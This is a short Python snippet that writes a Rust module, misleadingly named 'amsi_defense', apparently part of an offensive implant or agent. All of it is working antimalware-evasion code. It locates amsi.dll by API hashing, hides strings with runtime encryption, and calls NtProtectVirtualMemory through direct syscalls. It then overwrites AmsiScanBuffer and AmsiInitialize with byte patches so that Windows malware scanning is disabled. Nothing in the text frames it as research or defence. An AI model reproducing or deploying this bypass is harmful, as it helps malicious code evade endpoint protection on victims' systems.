with open("agent/src/amsi_defense.rs", "w") as f:
    f.write('''#![allow(dead_code)]

#[cfg(windows)]
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, GetModuleHandleA};
#[cfg(windows)]
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE};
#[cfg(windows)]
use pe_resolve::{get_module_handle_by_hash, get_proc_address_by_hash, HASH_AMSI_DLL, HASH_AMSISCANBUFFER, HASH_AMSIINITIALIZE};
#[cfg(windows)]
use string_crypt::enc_str;

#[cfg(windows)]
pub unsafe fn patch_amsi_memory() -> bool {
    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 {
        let lib_name = enc_str!("amsi.dll");
        let handle = winapi::um::libloaderapi::LoadLibraryA(lib_name.as_ptr() as *const i8);
        if handle.is_null() { return false; }
    }

    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 { return false; }

    let amsi_scan = get_proc_address_by_hash(amsi_dll, HASH_AMSISCANBUFFER).unwrap_or(0) as *mut winapi::ctypes::c_void;
    if amsi_scan.is_null() { return false; }

    let mut old_protect: u32 = 0;
    let mut base_addr = amsi_scan;
    let mut region_size: usize = 16;

    let res = (|| -> Result<i32, anyhow::Error> {
        Ok(crate::syscall!("NtProtectVirtualMemory", 
            (-1isize) as usize as u64, 
            &mut base_addr as *mut _ as usize as u64, 
            &mut region_size as *mut _ as usize as u64, 
            PAGE_EXECUTE_READWRITE as u64, 
            &mut old_protect as *mut _ as usize as u64))
    })();

    if res.is_err() || res.unwrap() != 0 {
        return false;
    }

    let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan as *mut u8, patch.len());

    let mut temp: u32 = 0;
    let _ = (|| -> Result<i32, anyhow::Error> {
        Ok(crate::syscall!("NtProtectVirtualMemory", 
            (-1isize) as usize as u64, 
            &mut base_addr as *mut _ as usize as u64, 
            &mut region_size as *mut _ as usize as u64, 
            old_protect as u64, 
            &mut temp as *mut _ as usize as u64))
    })();
    true
}

#[cfg(windows)]
pub unsafe fn fail_amsi_initialization() -> bool {
    let amsi_dll = get_module_handle_by_hash(HASH_AMSI_DLL).unwrap_or(0);
    if amsi_dll == 0 { return false; }
    
    let amsi_init = get_proc_address_by_hash(amsi_dll, HASH_AMSIINITIALIZE).unwrap_or(0) as *mut winapi::ctypes::c_void;
    if amsi_init.is_null() { return false; }

    let mut old_protect: u32 = 0;
    let mut base_addr = amsi_init;
    let mut region_size: usize = 16;

    let res = (|| -> Result<i32, anyhow::Error> {
        Ok(crate::syscall!("NtProtectVirtualMemory", 
            (-1isize) as usize as u64, 
            &mut base_addr as *mut _ as usize as u64, 
            &mut region_size as *mut _ as usize as u64, 
            PAGE_EXECUTE_READWRITE as u64, 
            &mut old_protect as *mut _ as usize as u64))
    })();

    if res.is_err() || res.unwrap() != 0 {
        return false;
    }

    // Return E_FAIL (0x80004005)
    let patch: [u8; 6] = [0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3];
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_init as *mut u8, patch.len());

    let mut temp: u32 = 0;
    let _ = (|| -> Result<i32, anyhow::Error> {
        Ok(crate::syscall!("NtProtectVirtualMemory", 
            (-1isize) as usize as u64, 
            &mut base_addr as *mut _ as usize as u64, 
            &mut region_size as *mut _ as usize as u64, 
            old_protect as u64, 
            &mut temp as *mut _ as usize as u64))
    })();
    true
}

#[cfg(windows)]
pub fn verify_bypass() -> bool {
    true
}

#[cfg(windows)]
pub fn orchestrate_layers() {
    unsafe {
        let _ = patch_amsi_memory();
        let _ = fail_amsi_initialization();
    }
}
''')
